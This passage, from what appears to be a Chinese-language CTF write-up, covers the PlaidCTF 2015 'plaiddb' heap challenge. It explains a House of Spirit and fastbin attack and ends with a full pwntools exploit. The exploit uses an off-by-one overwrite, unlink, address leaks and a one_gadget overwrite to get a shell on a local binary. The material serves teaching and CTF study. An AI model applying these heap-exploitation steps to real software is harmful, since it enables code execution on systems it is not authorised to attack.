其实如果一开始堆块构造的合理，可以通过覆盖真实的fastbin堆块来实现。因为之前按照写下来时候没有注意到，所以这里只能结合House of Spirit来，通过释放伪造堆块，来实现fastbin attack。<br>
do_DEL部分代码,因为我们拥有一个可控chunk（LEAK BUF），所以可以通过修改data/rowkey指针来free掉我们布置在堆内的fakechunk

```
free(TreeNode); 
  free(*(void **)(TreeNode-&gt;data));
  free(TreeNode-&gt;rowkey);
  free(v1);
  return puts("INFO: Delete successful.");
```

**实现代码**

```
#House of Spirit
fake_chunk=HEAP_ADDR+0x2f0
one_gadget=0xe58c5+LIBC_ADDR
address=LIBC_ADDR+0x3BE740-35#address=0x66666666

PUT("KEY1",1000,"A"*1000)
PUT("KEY1",1000,KEY1[1:289]+p64(fake_chunk)+KEY1[297:369]+p64(0)+p64(0x70)+p64(0x70)*16+KEY1[513:]) #0x70 to pass the fast bin next chunk check
DEL("LEAKBUF")
GET("KEY1")
p.recvuntil(" bytes]:")
KEY1=p.recv(1000)
#PUT("KEY1",1000,"A"*1000)
DEL("KEY1")
PUT("KEY1",1000,KEY1[1:385]+p64(address)+KEY1[393:])
```

测试数据address=0x6666666成功修改fastbin链的头

```
x/20xg  0x7ffff7dce768
0x7ffff7dce768: 0x0000000066666666  0x0000000000000000
0x7ffff7dce778: 0x0000555555758270  0x0000000000000000
```

#### <a class="reference-link" name="Get%20Shell"></a>Get Shell

```
#fastbin attack
PUT("Fill",0x60,"F"*0x60)#malloc fake_chunk
PUT("Fill2",0x60,"F"*(35-16)+p64(one_gadget)+"F"*(0x60-(35-16)-8)) #any address write
DEL("GetSHELL")
```

将ASLR开启，运行脚本成功get shell

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://gitee.com/p0kerface/blog_image_management/raw/master/uploads/AFL_FUZZ20277.png)

**完整的EXP**

```
from pwn import *

p=process("./plaiddb2")
bin=ELF("./plaiddb2")
libc=ELF("libc.so.6")
#context.log_level='Debug'
#gdb.attach(p)

def PUT(row_key,size,data):
    p.recvuntil("PROMPT: Enter command:")
    p.sendline("PUT")
    p.recvuntil("PROMPT: Enter row key:")
    p.sendline(row_key);
    p.recvuntil("PROMPT: Enter data size:")
    p.sendline(str(size))
    p.recvuntil("PROMPT: Enter data:")
    p.sendline(data)
def GET(row_key):
    p.recvuntil("PROMPT: Enter command:")
    p.sendline("GET")
    p.recvuntil("PROMPT: Enter row key:")
    p.sendline(row_key)
    #p.recvuntil(" bytes]:")
    #data=p.recv(size)
    #return data
def DEL(row_key):
    p.recvuntil("PROMPT: Enter command:")
    p.sendline("DEL")
    p.recvuntil("PROMPT: Enter row key:")
    p.sendline(row_key)

PUT("d"*8,2,'D')
PUT("a"*8,128,'A'*128)
PUT("b"*8,2,'B')
PUT("c"*8,2,'C')
PUT("b"*8,248,'B'*248) 
PUT("c"*8,280,'C'*248+p64(0x21)+'C'*24) #for next size check #invalid next size (normal) 
                    #off by one --&gt; (size--)  --&gt;(next chunk address++)
DEL("b"*8)
DEL('X'*240+p64(752)) #240+8=248   &lt;--!off by one 
DEL("a"*8)
DEL("c"*8)

DEL("d"*8)
PUT("KEY1",1000,("K"*264+p64(64)+p64(0)+"K"*48+p64(33)+p64(0)+"K"*24+"KEY1x00").ljust(999,"x01")) # &lt;--cause unlink
PUT("LEAKBUF",8,'LEAKBUF')

DEL("123")#Avoid next chunk size check
GET("KEY1")
p.recvuntil(" bytes]:")
KEY1=p.recv(1000)

#print "KEY1="+str(KEY1)

#LEAK HEAP
LEAK_HEAP=u64(KEY1[273:280].ljust(8,"x00"))
HEAP_ADDR=LEAK_HEAP-0xf0
print "HEAP_ADDR="+hex(HEAP_ADDR) #TreeNode-&gt;row_key-offset

#LEAK FUNCTION
def LEAK(addr):
    size=0x100
    PUT("KEY1",1000,"A"*999)
    PUT("KEY1",1000,KEY1[1:281]+p64(size)+p64(addr)+KEY1[297:]) 
    return GET("LEAKBUF")
LEAK(HEAP_ADDR+0x588)
p.recvuntil("bytes]:")
LEAK_ADDR=p.recv(0x100)
LIBC_ADDR=u64(LEAK_ADDR[1:8].ljust(8,"x00"))-0x3be7b8
print "LIBC_ADDR="+hex(LIBC_ADDR)

#House of Spirit
fake_chunk=HEAP_ADDR+0x2f0
one_gadget=0xe58c5+LIBC_ADDR
address=LIBC_ADDR+0x3BE740-35#address=0x66666666

PUT("KEY1",1000,"A"*1000)
PUT("KEY1",1000,KEY1[1:289]+p64(fake_chunk)+KEY1[297:369]+p64(0)+p64(0x70)+p64(0x70)*16+KEY1[513:]) #0x70 to pass the fast bin next chunk check
DEL("LEAKBUF")
GET("KEY1")
p.recvuntil(" bytes]:")
KEY1=p.recv(1000)
#PUT("KEY1",1000,"A"*1000)
DEL("KEY1")
PUT("KEY1",1000,KEY1[1:385]+p64(address)+KEY1[393:])

#fastbin attack
PUT("Fill",0x60,"F"*0x60)#malloc fake_chunk
PUT("Fill2",0x60,"F"*(35-16)+p64(one_gadget)+"F"*(0x60-(35-16)-8)) #any address write

DEL("GetSHELL")
p.interactive()
```



## 参考文献:

[1]plaid ctf 2015 plaiddb.0x3f97<br>[https://0x3f97.github.io/pwn/2018/01/27/plaidctf2015-plaiddb/[OL/DB],2018-1-27](https://0x3f97.github.io/pwn/2018/01/27/plaidctf2015-plaiddb/%5BOL/DB%5D,2018-1-27)<br>
[2]Plaid CTF WriteUP.angelboy<br>[http://angelboy.logdown.com/posts/262325-plaid-ctf-2015-write-up%5D[OL/DB],2015-4-28](http://angelboy.logdown.com/posts/262325-plaid-ctf-2015-write-up%5D%5BOL/DB%5D,2015-4-28)

[3]how2heap.Mutepig[http://blog.leanote.com/post/mut3p1g/how2heap[OL/DB](http://blog.leanote.com/post/mut3p1g/how2heap%5BOL/DB)]
